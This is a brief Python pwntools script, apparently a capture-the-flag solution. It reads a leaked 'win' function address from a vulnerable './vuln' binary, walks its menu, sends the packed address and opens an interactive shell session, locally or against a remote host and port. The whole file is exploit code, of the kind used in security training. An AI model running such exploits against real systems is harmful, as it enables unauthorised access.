from pwn import *

if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./vuln", )

elf = context.binary = ELF("./vuln", checksec=False)
rop = ROP(elf)

context.log_level = 'info'

io.sendline(b'S')

io.recvuntil(b'OOP! Memory leak...')
win = int(io.recvline(),16)
info("Win: %#x", win)

io.sendline(b'I')
io.sendline(b'Y')
time.sleep(1)
io.sendline(b'l')
io.recvall()

io.sendline(p32(win))

io.interactive()
